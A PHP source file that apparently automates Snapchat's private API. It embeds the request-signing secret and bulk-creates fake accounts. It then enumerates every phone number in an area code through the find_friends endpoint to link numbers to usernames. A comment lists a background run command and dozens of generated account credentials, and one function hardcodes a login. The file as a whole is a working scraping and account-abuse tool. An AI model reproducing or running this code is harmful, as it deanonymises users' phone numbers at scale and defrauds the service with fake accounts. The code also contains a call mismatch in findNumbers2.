<?php 

class BIM_Growth_Snapchat extends BIM_Growth{
    
    public static $staticToken = 'm198sOkJEn37DjqZ32lpRu76xmw288xSQ9';
    
    public static function createToken( $authToken, $timestamp ){
        $algo = 'sha256';
        $secret = "iEk21fuwZApXlz93750dmW22pw389dPwOk";
        $pattern = "0001110111101110001111010101111011010001001110011000110001000110";
        $first = hash($algo,$secret.$authToken);
        $second = hash($algo,$timestamp.$secret);
        $len = 64;
        $token = '';
        for( $n = 0; $n < $len; $n++ ){
            if( $pattern[$n] == "0" ){
                $token .= $first[$n];
            } else {
                $token .= $second[$n];
            }
        }
        return $token;
    }
    
    public static function register( $email, $password ){
        $time = time();
        $params = array(
            'timestamp' => $time,
            'req_token' => self::createToken( self::$staticToken, $time ),
            'email' => $email,
            'password' => $password,
            'age' => 45,
            'birthday' => "1968-06-05",
        );
        
        $headers = array(
            'Host: feelinsonice-hrd.appspot.com',
            'Accept-Locale: en_US',
            'Proxy-Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
            'Accept-Encoding: gzip',
            'Accept-Language: en;q=1, fr;q=0.9, de;q=0.8, ja;q=0.7, nl;q=0.6, it;q=0.5',
            'Connection: keep-alive',
            'User-Agent: Snapchat/6.1.0 (iPhone6,1; iOS 7.0.4; gzip)',
        );
        
        $self = new self();
        $url = 'https://feelinsonice-hrd.appspot.com/bq/register';
        $result = $self->post( $url, $params, false, $headers );
        return json_decode( $result );
    }
    
    public static function registeru( $username, $email ){
        $time = time();
        $params = array(
            'timestamp' => $time,
            'req_token' => self::createToken( self::$staticToken, $time ),
            'email' => $email,
            'username' => $username
        );
        
        $headers = array(
            'Host: feelinsonice-hrd.appspot.com',
            'Accept-Locale: en_US',
            'Proxy-Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
            'Accept-Encoding: gzip',
            'Accept-Language: en;q=1, fr;q=0.9, de;q=0.8, ja;q=0.7, nl;q=0.6, it;q=0.5',
            'Connection: keep-alive',
            'User-Agent: Snapchat/6.1.0 (iPhone6,1; iOS 7.0.4; gzip)',
        );
        
        $self = new self();
        $url = 'https://feelinsonice.appspot.com/ph/registeru';
        $result = $self->post( $url, $params, false, $headers );
        return json_decode( $result );
    }
    
    public static function login( $username, $password ){
        $time = time();
        $params = array(
            'timestamp' => $time,
            'req_token' => self::createToken( self::$staticToken, $time ),
            'password' => $password,
            'username' => $username
        );
        
        $headers = array(
            'Host: feelinsonice-hrd.appspot.com',
            'Accept-Locale: en_US',
            'Proxy-Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
            'Accept-Encoding: gzip',
            'Accept-Language: en;q=1, fr;q=0.9, de;q=0.8, ja;q=0.7, nl;q=0.6, it;q=0.5',
            'Connection: keep-alive',
            'User-Agent: Snapchat/6.1.0 (iPhone6,1; iOS 7.0.4; gzip)',
        );
        
        $self = new self();
        $url = 'https://feelinsonice.appspot.com/bq/login';
        $result = $self->post( $url, $params, false, $headers );
        return json_decode( $result );
    }
    
    public static function findFriends( $authToken, $username, $number ){
        /*
            {
                username: "youraccount",
                timestamp: 1373207221,
                req_token: create_token(auth_token, 1373207221),
                countryCode: "US",
                numbers: "{\"2125554240\": \"Norm (Security)\", \"3114378739\": \"Stephen Falken\"}"
            }
        */
        $time = time();
        $params = array(
            'username' => $username,
        	'timestamp' => $time,
            'req_token' => self::createToken( $authToken, $time ),
            'countryCode' => "US",
            'numbers' => json_encode(
                array(
                    $number => "Norm (Security)",
                )
            )
        );
        
        $headers = array(
            'Host: feelinsonice-hrd.appspot.com',
            'Accept-Locale: en_US',
            'Proxy-Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
            'Accept-Encoding: gzip',
            'Accept-Language: en;q=1, fr;q=0.9, de;q=0.8, ja;q=0.7, nl;q=0.6, it;q=0.5',
            'Connection: keep-alive',
            'User-Agent: Snapchat/6.1.0 (iPhone6,1; iOS 7.0.4; gzip)',
        );
        
        $self = new self();
        $url = 'https://feelinsonice.appspot.com/ph/find_friends';
        $result = $self->post( $url, $params, false, $headers );
        
        print_r( $result );
        
        return json_decode( $result );
    }
/**
shuf 214 > 214.shuf; nohup /usr/bin/php -r 'require_once "vendor/autoload.php"; BIM_Growth_Snapchat::findNumbers('214.shuf','a52be6050e9dc6','52be6050e9e1f');' > findnumbers.214.log 2>&1 &
a52be6057b1fc6:52be6057b2031:a52be6057b1fc6@hotmail.com:215
a52be605e587d3:52be605e58831:a52be605e587d3@gmail.com:262
a52be6064d09b6:52be6064d0a16:a52be6064d09b6@hotmail.com:303
a52be606b6a9b2:52be606b6aa18:a52be606b6a9b2@gmail.com:317
a52be6071b1d73:52be6071b1dda:a52be6071b1d73@gmail.com:410
a52be607880d5e:52be607880dc3:a52be607880d5e@comcast.com:443
a52be607f77727:52be607f7778f:a52be607f77727@hotmail.com:449
a52be6086200c9:52be60862012f:a52be6086200c9@hotmail.com:480
a52be608d04680:52be608d046ec:a52be608d04680@comcast.com:484
a52be6094108d8:52be60941093e:a52be6094108d8@hotmail.com:508
a52be609aaeea4:52be609aaef08:a52be609aaeea4@comcast.com:510
a52be60a1b4902:52be60a1b4968:a52be60a1b4902@hotmail.com:512
a52be60a85f460:52be60a85f4bc:a52be60a85f460@gmail.com:586
a52be60aeedaec:52be60aeedb47:a52be60aeedaec@comcast.com:609
a52be60b5bf8c1:52be60b5bf91d:a52be60b5bf8c1@hotmail.com:610
a52be60bcd9489:52be60bcd94e8:a52be60bcd9489@hotmail.com:612
a52be60c38e550:52be60c38e5b9:a52be60c38e550@gmail.com:617
a52be60c9e64f4:52be60c9e655d:a52be60c9e64f4@hotmail.com:636
a52be60d11f75c:52be60d11f7bf:a52be60d11f75c@comcast.com:651
a52be60d776eb0:52be60d776f15:a52be60d776eb0@gmail.com:678
a52be60de25afd:52be60de25b64:a52be60de25afd@gmail.com:689
a52be60e59e7e2:52be60e59e84a:a52be60e59e7e2@gmail.com:708
a52be60ec72657:52be60ec726be:a52be60ec72657@hotmail.com:734
a52be60f3508fe:52be60f350968:a52be60f3508fe@comcast.com:763
a52be60f9da320:52be60f9da387:a52be60f9da320@gmail.com:774
a52be610073aa3:52be610073b0a:a52be610073aa3@gmail.com:831
a52be6106ecfed:52be6106ed053:a52be6106ecfed@hotmail.com:832
a52be610d3b4ab:52be610d3b512:a52be610d3b4ab@hotmail.com:845
a52be61146738c:52be6114673ed:a52be61146738c@comcast.com:913
a52be611b2fe87:52be611b2fef0:a52be611b2fe87@hotmail.com:972
a52be6121e435b:52be6121e442a:a52be6121e435b@hotmail.com:516
a52be6128d656a:52be6128d65ce:a52be6128d656a@comcast.com:551
a52be612fee163:52be612fee1ca:a52be612fee163@gmail.com:650
a52be6136481e0:52be61364820f:a52be6136481e0@hotmail.com:703
a52be613d13f7b:52be613d13fe0:a52be613d13f7b@hotmail.com:847
a52be61435348b:52be6143534f2:a52be61435348b@gmail.com:925
a52be6149df9ac:52be6149dfa0d:a52be6149df9ac@gmail.com:703
a52be615019c6e:52be615019cd5:a52be615019c6e@hotmail.com:224
a52be6156e3f71:52be6156e3fd5:a52be6156e3f71@gmail.com:516
a52be615d8cf22:52be615d8cf87:a52be615d8cf22@gmail.com:914
a52be6164630ec:52be616463154:a52be6164630ec@comcast.com:949
a52be616ac0ec9:52be616ac0f30:a52be616ac0ec9@hotmail.com:201 
*/
    
    public static function findNumbers( $file, $username, $password ){
        $loggedIn = self::login( $username, $password );
        $authToken = $loggedIn->auth_token;
        $username = $loggedIn->username;
        
        $numbers = fopen($file,'rb'); //file("path to number file");
        while( $number = trim( fgets( $numbers ) ) ){
            echo "searching for $number\n";
            $result = self::findFriends( $authToken, $username, $number );
            print_r( $result );
            if( !empty( $result->results[0]->name ) ){
                echo $result->results[0]->name, " => " , $number,"\n";
            }
            self::sleep(2,"testing matching");
        }
    }
    
    public static function genNumbers( $areaCode ){
        //$areaCodes = array("571","914","516","703","925","408","949","650","980","224","847","630","201","351","203","973","248","339","631","732","551","862","415","978","240","858","947","301","714","425","952","860","848","763","774","609","617","480","510","508","262","469","610","734","443","708","831","484","303","651","972","317","410","612","586","913","512","636","832","845","215","678","214");
        $prefixStarts = array(2,3,4,5,6,7,8,9);
        $totalNumbers = pow(10,6);
        $fh = fopen($areaCode, 'wb');
        foreach( $prefixStarts as $prefix ){
            for($n = 0; $n < $totalNumbers; $n++ ){
                // make a left padded number with zeroes
                // append it to the area code
                // echo the number
                $number = str_pad($n, 6, "0", STR_PAD_LEFT);
                fwrite( $fh, "{$areaCode}{$prefix}{$number}\n" );
            }
        }
    }
    
    public static function makeAccounts( ){
        //$accounts = fopen($file, "rb");
        //while( $info = trim( fgets($accounts) ) ){
        $domains = array( 'gmail.com', 'hotmail.com', 'comcast.com' );
        $alpha = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z');
        for( $n = 0; $n < 50; $n++ ){
            $f = $alpha[array_rand( $alpha )];
            $l = $alpha[array_rand( $alpha )];
            $username = $f.'oog'.$l;
            $password = uniqid('');
            
            $domain = $domains[ array_rand($domains) ];
            $f = $alpha[array_rand( $alpha )];
            $l = $alpha[array_rand( $alpha )];
            $mailName = $f.'kok'.$l;
            $email = "$mailName@$domain";
            
            $response = self::register( $email, $password );
            print_r( $response );
            if ( empty( $response->logged ) ){
                self::sleep(5,"$username, $password, $email taken\n");
                continue;
            }
            
            self::sleep(5,"created account for $password, $email\n");
            
            $response = self::registeru($username, $email);
            print_r( $response );
            if ( empty( $response->logged ) ){
                self::sleep(5,"$username taken\n");
                continue;
            }
            
            echo "success: $username:$password:$email\n";
        } 
    }
    
    public static function findFriends2( $authToken, $username, $numbers ){
        /*
            {
                username: "youraccount",
                timestamp: 1373207221,
                req_token: create_token(auth_token, 1373207221),
                countryCode: "US",
                numbers: "{\"2125554240\": \"Norm (Security)\", \"3114378739\": \"Stephen Falken\"}"
            }
        */
        
        $time = time();
        
        $params = array(
            'username' => $username,
        	'timestamp' => $time,
            'req_token' => self::createToken( $authToken, $time ),
            'countryCode' => "US",
            'numbers' => json_encode( $numbers )
        );
        
        $headers = array(
            'Host: feelinsonice-hrd.appspot.com',
            'Accept-Locale: en_US',
            'Proxy-Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
            'Accept-Encoding: gzip',
            'Accept-Language: en;q=1, fr;q=0.9, de;q=0.8, ja;q=0.7, nl;q=0.6, it;q=0.5',
            'Connection: keep-alive',
            'User-Agent: Snapchat/6.1.0 (iPhone6,1; iOS 7.0.4; gzip)',
        );
        
        $self = new self();
        $url = 'https://feelinsonice.appspot.com/ph/find_friends';
        $result = $self->post( $url, $params, false, $headers );
        
        print_r( array( $result, $numbers ) );
        
        return json_decode( $result );
    }
    
    public static function findNumbers2( $file ){
        $loggedIn = self::login('jajajakl','i8ngot6');
        $authToken = $loggedIn->auth_token;
        $username = $loggedIn->username;
        
        $numbers = fopen($file,'rb'); //file("path to number file");
        $search = array();
        while( !feof($numbers) ){
            for( $n = 0; $n < 10; $n++ ){
                $number = trim( fgets( $numbers ) );
                if( $number ){
                    $search[ $number ] = uniqid();
                    echo "searching for $number\n";
                }
            }
            $result = self::findFriends( $authToken, $username, $search );
            if( !empty( $result->results ) ){
                foreach( $result->results as $match ){
                    foreach( $search as $number => $display ){
                        if( $display == $match->display ){
                            echo $match->name, " => " , $number,"\n";
                            break;
                        }
                    }
                }
            }
        }
    }
}